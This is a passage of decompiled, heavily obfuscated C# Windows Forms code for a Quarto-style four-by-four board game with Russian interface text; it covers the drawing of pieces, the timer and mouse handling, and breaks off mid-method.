using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -220896369;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xAFFC525Cu) % 7u)
					{
					case 6u:
						Dark = dark;
						Big = big;
						num = ((int)num2 * -413713373) ^ 0x10DD8BCA;
						continue;
					case 5u:
						Square = square;
						num = (int)(num2 * 369524702) ^ -1052747122;
						continue;
					case 4u:
						num = (int)(num2 * 1586801222) ^ -358505487;
						continue;
					case 1u:
						num = (int)((num2 * 37867470) ^ 0x50595A20);
						continue;
					case 0u:
						Point = point;
						num = (int)(num2 * 1828165045) ^ -1897769144;
						continue;
					default:
						return;
					case 3u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -1973723423;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xA98828D6u) % 3u)
					{
					case 2u:
						goto IL_0008;
					case 0u:
						break;
					default:
						Point = copy.Point;
						return;
					}
					break;
					IL_0008:
					Dark = copy.Dark;
					Big = copy.Big;
					Square = copy.Square;
					num = ((int)num2 * -489119499) ^ 0x1EEE3854;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -25400939;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE0EA18D1u) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -944947232) ^ -637579347;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		while (true)
		{
			int num = -803896601;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA9B2A29Au) % 9u)
				{
				case 8u:
					num = ((int)num2 * -986405560) ^ 0x42B9BBC5;
					continue;
				case 7u:
					num = -1722013606;
					continue;
				case 6u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) >= 296)
					{
						num = -1749138925;
						num3 = -1749138925;
					}
					else
					{
						num = -1681591878;
						num3 = -1681591878;
					}
					continue;
				}
				case 4u:
					num = (int)(num2 * 1989085688) ^ -778318090;
					continue;
				case 2u:
					num = ((int)num2 * -647843241) ^ -1943115607;
					continue;
				case 1u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)((num2 * 1946657417) ^ 0x1FFF71CB);
					continue;
				}
				case 0u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -1218367744) ^ -477653365;
					continue;
				default:
					return;
				case 5u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num6 = default(int);
		bool flag2 = default(bool);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -1570948710;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x88661431u) % 23u)
				{
				case 22u:
					num = ((int)num2 * -374520617) ^ 0x184E97F;
					continue;
				case 21u:
					storage = new Figurine[4, 4];
					num = (int)(num2 * 985421338) ^ -1680391241;
					continue;
				case 19u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 804948983) ^ -2127832783;
					continue;
				case 18u:
					num6++;
					num = (int)((num2 * 1565550335) ^ 0x786EFC1D);
					continue;
				case 16u:
					board = new Figurine[4, 4];
					num = (int)(num2 * 531851669) ^ -2057021907;
					continue;
				case 15u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = -1424349724;
						num8 = -1424349724;
					}
					else
					{
						num7 = -394485169;
						num8 = -394485169;
					}
					num = num7 ^ ((int)num2 * -1084895892);
					continue;
				}
				case 14u:
					storage[num6, num3] = new Figurine(num6 < 2, num3 % 2 == 0, num3 < 2, num6 % 2 == 1);
					num = (int)(num2 * 1799240949) ^ -158500219;
					continue;
				case 13u:
					num = (int)(num2 * 1248384059) ^ -2144784237;
					continue;
				case 12u:
					Form1.smethod_5((Control)(object)borderBox[num6, num3], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num6, num3], bool_0: false);
					num = ((int)num2 * -118642316) ^ 0x4CDB65A0;
					continue;
				case 11u:
					Paint_Board();
					num = ((int)num2 * -1755076466) ^ 0x6CD75050;
					continue;
				case 10u:
					Paint_Storage();
					num = ((int)num2 * -1740282262) ^ -2034649609;
					continue;
				case 9u:
					num6 = 0;
					num = ((int)num2 * -1804359341) ^ -1285429764;
					continue;
				case 8u:
					num = ((int)num2 * -1866182558) ^ 0x5A851F1F;
					continue;
				case 7u:
					num3++;
					num = ((int)num2 * -530028206) ^ -532464419;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 424150169) ^ 0x606DE7B0);
					continue;
				case 5u:
					flag2 = num6 < 4;
					num = -512505699;
					continue;
				case 4u:
					num3 = 0;
					num = -764193287;
					continue;
				case 3u:
					num = -989788895;
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -251705530;
						num5 = -251705530;
					}
					else
					{
						num4 = -2029821930;
						num5 = -2029821930;
					}
					num = num4 ^ ((int)num2 * -1333565271);
					continue;
				}
				case 1u:
					flag = num3 < 4;
					num = -1515307919;
					continue;
				case 0u:
					num = ((int)num2 * -653237429) ^ -496493320;
					continue;
				default:
					return;
				case 20u:
					break;
				case 17u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num7 = default(int);
		int num9 = default(int);
		float num5 = default(float);
		float num15 = default(float);
		float num10 = default(float);
		float num21 = default(float);
		float num6 = default(float);
		Brush brush_ = default(Brush);
		Graphics graphics_ = default(Graphics);
		bool flag = default(bool);
		bool big = default(bool);
		bool square = default(bool);
		while (true)
		{
			int num = -1155805977;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x95BDAB40u) % 41u)
				{
				case 40u:
				{
					int num13;
					int num14;
					if (!board[num7, num9].Dark)
					{
						num13 = -1920679134;
						num14 = -1920679134;
					}
					else
					{
						num13 = -1071296790;
						num14 = -1071296790;
					}
					num = num13 ^ (int)(num2 * 835752714);
					continue;
				}
				case 39u:
					num = -1909025136;
					continue;
				case 38u:
					num5 = 1f - num15 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -1132968213;
					continue;
				case 37u:
					num = (int)((num2 * 477650914) ^ 0x6361D413);
					continue;
				case 36u:
					num10 = num21 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1006358039) ^ -315041019;
					continue;
				case 35u:
					num = -1215750244;
					continue;
				case 34u:
					num5 = 1f - num15 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1693489520;
					continue;
				case 33u:
					num7 = 0;
					num = (int)(num2 * 863209631) ^ -36066476;
					continue;
				case 32u:
					num6 = (float)size * (num5 / 2f);
					num = (int)(num2 * 1447676473) ^ -1029519036;
					continue;
				case 31u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1909199601) ^ 0x392337BF;
					continue;
				case 30u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -968928831) ^ 0x7395E5AD;
					continue;
				case 29u:
				{
					int num8;
					if (num7 < 4)
					{
						num = -400666675;
						num8 = -400666675;
					}
					else
					{
						num = -1777741933;
						num8 = -1777741933;
					}
					continue;
				}
				case 28u:
					num6 = (float)size * (num5 / 2f);
					num = (int)((num2 * 1305151638) ^ 0x667105FD);
					continue;
				case 27u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6 + (float)(num9 * size), num6 + (float)(num7 * size), num10, num10);
					num = (int)(num2 * 1030363584) ^ -1474523010;
					continue;
				case 26u:
					num10 = num21 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1028737789) ^ 0x395FFBB0);
					continue;
				case 25u:
					Form1.smethod_28(graphics_, brush_, num6 + (float)(num9 * size), num6 + (float)(num7 * size), num10, num10);
					num = ((int)num2 * -1077942225) ^ -354545273;
					continue;
				case 24u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -465843643) ^ -1050943286;
					continue;
				case 23u:
					num = (int)((num2 * 1419087590) ^ 0x1719B9C0);
					continue;
				case 21u:
					num9++;
					num = ((int)num2 * -128366807) ^ -2061559406;
					continue;
				case 20u:
					flag = board[num7, num9] != null;
					num = ((int)num2 * -536441841) ^ 0x96D609D;
					continue;
				case 19u:
					num21 = (float)size * num15;
					num = (int)((num2 * 1710837241) ^ 0x57546BD2);
					continue;
				case 18u:
					num15 = 1f;
					num = (int)(num2 * 1749662649) ^ -1834785573;
					continue;
				case 17u:
					num = -1931300415;
					continue;
				case 16u:
					num9 = 0;
					num = -2116120638;
					continue;
				case 15u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num9 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 802747231) ^ 0x2168D8C7);
					continue;
				case 14u:
					num7++;
					num = (int)(num2 * 28537974) ^ -1468142101;
					continue;
				case 13u:
				{
					int num19;
					int num20;
					if (!board[num7, num9].Point)
					{
						num19 = -733588770;
						num20 = -733588770;
					}
					else
					{
						num19 = -905780785;
						num20 = -905780785;
					}
					num = num19 ^ (int)(num2 * 245710801);
					continue;
				}
				case 12u:
					num = (int)((num2 * 821232224) ^ 0x583B6CE8);
					continue;
				case 10u:
					big = board[num7, num9].Big;
					num = -1394248653;
					continue;
				case 9u:
				{
					int num18;
					if (num9 < 4)
					{
						num = -845586017;
						num18 = -845586017;
					}
					else
					{
						num = -1042309809;
						num18 = -1042309809;
					}
					continue;
				}
				case 8u:
				{
					int num16;
					int num17;
					if (!flag)
					{
						num16 = -255636319;
						num17 = -255636319;
					}
					else
					{
						num16 = -2068715020;
						num17 = -2068715020;
					}
					num = num16 ^ ((int)num2 * -1918256626);
					continue;
				}
				case 7u:
					num15 = 0.7f;
					num = -1730373941;
					continue;
				case 6u:
					square = board[num7, num9].Square;
					num = (int)((num2 * 1727755579) ^ 0x7C37EB8A);
					continue;
				case 5u:
					Form1.smethod_24(graphics_, brush_, num6 + (float)(num9 * size), num6 + (float)(num7 * size), num10, num10);
					num = -1175229321;
					continue;
				case 4u:
				{
					int num11;
					int num12;
					if (!square)
					{
						num11 = 1414914956;
						num12 = 1414914956;
					}
					else
					{
						num11 = 163057649;
						num12 = 163057649;
					}
					num = num11 ^ ((int)num2 * -507951724);
					continue;
				}
				case 3u:
				{
					int num3;
					int num4;
					if (!big)
					{
						num3 = 894592593;
						num4 = 894592593;
					}
					else
					{
						num3 = 1774231311;
						num4 = 1774231311;
					}
					num = num3 ^ (int)(num2 * 1271042021);
					continue;
				}
				case 2u:
					num = (int)(num2 * 1150461133) ^ -1184866418;
					continue;
				case 1u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -624277595) ^ -436347538;
					continue;
				case 0u:
					brush_ = Form1.smethod_26();
					num = -708833107;
					continue;
				default:
					return;
				case 11u:
					break;
				case 22u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		float num13 = default(float);
		float num4 = default(float);
		float num14 = default(float);
		float num10 = default(float);
		float num15 = default(float);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		bool flag2 = default(bool);
		int num9 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool point = default(bool);
		bool flag4 = default(bool);
		bool big = default(bool);
		while (true)
		{
			int num2 = 2025362488;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x4FE1FDF9u) % 40u)
				{
				case 39u:
					num13 = (float)size * num4;
					num2 = (int)(num3 * 1386251074) ^ -514523879;
					continue;
				case 38u:
					num14 = (float)size * (num10 / 2f) - 4f;
					num15 = num13 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1684926285) ^ -1715048673;
					continue;
				case 37u:
					Form1.smethod_24(graphics_, brush_, num14, num14, num15, num15);
					num2 = 515126876;
					continue;
				case 36u:
					flag2 = num9 < 2;
					num2 = ((int)num3 * -27245810) ^ -422492678;
					continue;
				case 35u:
				{
					int num22;
					int num23;
					if (!flag3)
					{
						num22 = -888045586;
						num23 = -888045586;
					}
					else
					{
						num22 = -1319320559;
						num23 = -1319320559;
					}
					num2 = num22 ^ ((int)num3 * -141628955);
					continue;
				}
				case 34u:
					flag = num < 4;
					num2 = 1032151347;
					continue;
				case 33u:
					num2 = ((int)num3 * -170644380) ^ -950504170;
					continue;
				case 32u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 7744764) ^ 0x7727CF41);
					continue;
				case 31u:
					num15 = num13 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num, num9].Point;
					num2 = (int)((num3 * 1731643348) ^ 0x5FECE44B);
					continue;
				case 30u:
					Form1.smethod_30((Control)(object)pictureBox[num, num9]);
					num2 = 295163325;
					continue;
				case 29u:
					num2 = ((int)num3 * -1513216632) ^ -313713871;
					continue;
				case 28u:
					brush_ = Form1.smethod_26();
					num2 = 2044443124;
					continue;
				case 27u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = 170094525;
						num8 = 170094525;
					}
					else
					{
						num7 = 374568018;
						num8 = 374568018;
					}
					num2 = num7 ^ (int)(num3 * 1609044067);
					continue;
				}
				case 26u:
					num2 = ((int)num3 * -1944159514) ^ 0x2E502EE5;
					continue;
				case 25u:
					num9 = 0;
					num2 = 990902654;
					continue;
				case 24u:
					num9++;
					num2 = 990902654;
					continue;
				case 23u:
					flag4 = num9 < 4;
					num2 = 1956744705;
					continue;
				case 22u:
				{
					int num20;
					int num21;
					if (!point)
					{
						num20 = -1619161459;
						num21 = -1619161459;
					}
					else
					{
						num20 = -747182332;
						num21 = -747182332;
					}
					num2 = num20 ^ ((int)num3 * -1001175037);
					continue;
				}
				case 21u:
				{
					int num18;
					int num19;
					if (big)
					{
						num18 = -1308161360;
						num19 = -1308161360;
					}
					else
					{
						num18 = -962315254;
						num19 = -962315254;
					}
					num2 = num18 ^ ((int)num3 * -481945350);
					continue;
				}
				case 20u:
					num2 = ((int)num3 * -2068755748) ^ 0x2E5B05F5;
					continue;
				case 19u:
					num4 = 1f;
					num2 = ((int)num3 * -1691765948) ^ -1311311332;
					continue;
				case 18u:
					Form1.smethod_28(graphics_, brush_, num14, num14, num15, num15);
					num2 = (int)(num3 * 1233870172) ^ -1074468309;
					continue;
				case 17u:
					num2 = (int)((num3 * 701810281) ^ 0x4B4CC01A);
					continue;
				case 16u:
				{
					int num16;
					int num17;
					if (flag4)
					{
						num16 = -1761482758;
						num17 = -1761482758;
					}
					else
					{
						num16 = -2138760769;
						num17 = -2138760769;
					}
					num2 = num16 ^ ((int)num3 * -1085818023);
					continue;
				}
				case 15u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num14, num14, num15, num15);
					num2 = ((int)num3 * -1855684747) ^ 0x19D25544;
					continue;
				case 14u:
					num++;
					num2 = ((int)num3 * -641753723) ^ -294420923;
					continue;
				case 13u:
					big = storage[num, num9].Big;
					num2 = 855375700;
					continue;
				case 12u:
					num14 = (float)size * (num10 / 2f) - 4f;
					num2 = (int)(num3 * 1145369790) ^ -438006298;
					continue;
				case 11u:
					flag3 = storage[num, num9] != null;
					num2 = 1946868610;
					continue;
				case 10u:
				{
					int num11;
					int num12;
					if (!storage[num, num9].Dark)
					{
						num11 = 1347852537;
						num12 = 1347852537;
					}
					else
					{
						num11 = 1819112133;
						num12 = 1819112133;
					}
					num2 = num11 ^ ((int)num3 * -485851954);
					continue;
				}
				case 8u:
					num10 = 1f - num4 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = 476388101;
					continue;
				case 7u:
					Form1.smethod_20(pictureBox[num, num9], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num9]), Form1.smethod_16((Control)(object)pictureBox[num, num9])));
					num2 = (int)((num3 * 1434153827) ^ 0x1FB3862);
					continue;
				case 6u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num9]));
					num2 = (int)(num3 * 492981036) ^ -480971829;
					continue;
				case 4u:
					num2 = ((int)num3 * -727883791) ^ -1216368043;
					continue;
				case 3u:
					num10 = 1f - num4 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = 863304214;
					continue;
				case 2u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 1555956644;
						num6 = 1555956644;
					}
					else
					{
						num5 = 681305176;
						num6 = 681305176;
					}
					num2 = num5 ^ (int)(num3 * 1238044030);
					continue;
				}
				case 1u:
					num4 = 0.7f;
					num2 = 1887869330;
					continue;
				case 0u:
					num2 = ((int)num3 * -62000137) ^ -1102494916;
					continue;
				default:
					return;
				case 9u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num3 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -206316627;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8B6E9A77u) % 30u)
				{
				case 29u:
					num = ((int)num2 * -408014695) ^ -1150379245;
					continue;
				case 28u:
					num3 = 0;
					num = ((int)num2 * -936822246) ^ 0x3E8796FA;
					continue;
				case 27u:
					num = (int)(num2 * 1721164703) ^ -1674055974;
					continue;
				case 26u:
					num = (int)((num2 * 1075223938) ^ 0x2DA87C88);
					continue;
				case 24u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -807824205) ^ 0xA529B4D;
					continue;
				case 23u:
					Form1.smethod_5((Control)(object)borderBox[num6, num5], Color.Blue);
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 994017276) ^ -1506815969;
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -270637354) ^ 0x6430CDB6;
					continue;
				case 20u:
					num = (int)(num2 * 936021140) ^ -123362106;
					continue;
				case 19u:
					num4 = 0;
					num = -48662491;
					continue;
				case 18u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -530976451) ^ -1745332161;
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1861817207) ^ 0x39F2591;
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (!turn)
					{
						num10 = 1018794525;
						num11 = 1018794525;
					}
					else
					{
						num10 = 1617938352;
						num11 = 1617938352;
					}
					num = num10 ^ (int)(num2 * 422722133);
					continue;
				}
				case 15u:
				{
					int num9;
					if (num4 < 4)
					{
						num = -381039423;
						num9 = -381039423;
					}
					else
					{
						num = -106682437;
						num9 = -106682437;
					}
					continue;
				}
				case 14u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = -246415736;
						num8 = -246415736;
					}
					else
					{
						num7 = -1930921930;
						num8 = -1930921930;
					}
					num = num7 ^ ((int)num2 * -760609938);
					continue;
				}
				case 13u:
					num4++;
					num = (int)(num2 * 981452327) ^ -325111415;
					continue;
				case 12u:
					num6 = Form1.smethod_33(rnd, 4);
					num = -223019055;
					continue;
				case 11u:
					num = (int)(num2 * 158302496) ^ -323882417;
					continue;
				case 10u:
					num = ((int)num2 * -1560003922) ^ 0x5EFBC141;
					continue;
				case 9u:
					step = 0;
					num = ((int)num2 * -2080624165) ^ -1625280305;
					continue;
				case 8u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = (int)(num2 * 413886633) ^ -1581434707;
					continue;
				case 7u:
					num = (int)(num2 * 1390407637) ^ -1539518549;
					continue;
				case 6u:
					num5 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -436155528) ^ -1804384620;
					continue;
				case 5u:
					step = 1;
					num = ((int)num2 * -1570744097) ^ -913900998;
					continue;
				case 4u:
					num3++;
					num = ((int)num2 * -517157779) ^ -846402254;
					continue;
				case 3u:
					flag = num3 < 4;
					num = -768018051;
					continue;
				case 2u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 565801356) ^ -1763581300;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -516697804;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = -1468139914;
					continue;
				default:
					return;
				case 21u:
					break;
				case 25u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1369793630;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8987B45Bu) % 5u)
				{
				case 4u:
					num = ((int)num2 * -1900927676) ^ -961268904;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)((num2 * 27935848) ^ 0x6AF8909D);
					continue;
				case 1u:
					time = time.AddSeconds(1.0);
					num = ((int)num2 * -1633694201) ^ 0x5533B05;
					continue;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_01aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num8 = default(int);
		bool flag2 = default(bool);
		int num5 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 612103611;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0x50D9D50Au) % 24u)
				{
				case 23u:
					num8 -= 4;
					num = ((int)num2 * -1492706502) ^ 0x6AD1ECD6;
					continue;
				case 22u:
				{
					int num12;
					int num13;
					if (num8 <= 1)
					{
						num12 = -912820066;
						num13 = -912820066;
					}
					else
					{
						num12 = -576551277;
						num13 = -576551277;
					}
					num = num12 ^ (int)(num2 * 1337476949);
					continue;
				}
				case 21u:
					flag2 = num5 < 4;
					num = 1745552994;
					continue;
				case 20u:
					num5++;
					num = (int)((num2 * 980866442) ^ 0x47183D0F);
					continue;
				case 19u:
					num4 = 0;
					num = ((int)num2 * -1012764933) ^ 0x1EE8DAB5;
					continue;
				case 18u:
					if (storage[num3, num8] != null)
					{
						num = 1109935395;
						continue;
					}
					num9 = 0;
					goto IL_00ad;
				case 17u:
					Form1.smethod_5((Control)(object)borderBox[num3, num8], Color.Red);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 813467211) ^ -2041760764;
					continue;
				case 16u:
				{
					int num14;
					int num15;
					if (!flag3)
					{
						num14 = -2118977610;
						num15 = -2118977610;
					}
					else
					{
						num14 = -1213288938;
						num15 = -1213288938;
					}
					num = num14 ^ (int)(num2 * 125329062);
					continue;
				}
				case 15u:
					num4++;
					num = ((int)num2 * -426935262) ^ 0x36249852;
					continue;
				case 14u:
					num = ((int)num2 * -1034451870) ^ -1726601766;
					continue;
				case 13u:
					num = ((int)num2 * -363174077) ^ -378808160;
					continue;
				case 12u:
					num = ((int)num2 * -960886208) ^ -2147166367;
					continue;
				case 11u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num8 = point.X / size;
					num = (int)((num2 * 2054121427) ^ 0x6BD568A5);
					continue;
				case 9u:
					num9 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num3, num8]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00ad;
				case 8u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = -1658984344;
						num11 = -1658984344;
					}
					else
					{
						num10 = -645192987;
						num11 = -645192987;
					}
					num = num10 ^ (int)(num2 * 1944260123);
					continue;
				}
				case 7u:
					num5 = 0;
					num = 1521529975;
					continue;
				case 6u:
					flag = num4 < 4;
					num = 577242465;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 365311789) ^ 0x3E1E0033);
					continue;
				case 3u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = -360710707;
						num7 = -360710707;
					}
					else
					{
						num6 = -843987773;
						num7 = -843987773;
					}
					num = num6 ^ (int)(num2 * 1972375754);
					continue;
				}
				case 2u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.White);
					num = 1007328534;
					continue;
				case 1u:
					num3 = point.Y / size;
					num = (int)(num2 * 366589296) ^ -1614889591;
					continue;
				case 0u:
					num = ((int)num2 * -1574286886) ^ -1905287388;
					continue;
				default:
					return;
				case 10u:
					break;
				case 4u:
					return;
					IL_00ad:
					flag3 = (byte)num9 != 0;
					num = 1232019138;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		int num6 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 770657490;
			while (true)
			{
				uint num2;
				int num13;
				switch ((num2 = (uint)num ^ 0x82CD00Bu) % 26u)
				{
				case 25u:
					num = ((int)num2 * -761278316) ^ 0x381540EC;
					continue;
				case 24u:
				{
					int num12;
					if (num5 < 4)
					{
						num = 1499505772;
						num12 = 1499505772;
					}
					else
					{
						num = 1696957118;
						num12 = 1696957118;
					}
					continue;
				}
				case 23u:
					num = (int)((num2 * 1210590420) ^ 0x49994812);
					continue;
				case 22u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1519169034) ^ -705270056;
					continue;
				case 21u:
					Paint_Board();
					num = ((int)num2 * -1354972857) ^ -1507639930;
					continue;
				case 20u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = -771605495;
						num9 = -771605495;
					}
					else
					{
						num8 = -2070026878;
						num9 = -2070026878;
					}
					num = num8 ^ (int)(num2 * 1668417265);
					continue;
				}
				case 19u:
					num = ((int)num2 * -384938171) ^ -1952357323;
					continue;
				case 18u:
					num6++;
					num = 916222517;
					continue;
				case 17u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 320593736) ^ -126201628;
					continue;
				case 16u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num3 * size + 4, num4 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -802872898) ^ -2112404888;
					continue;
				case 14u:
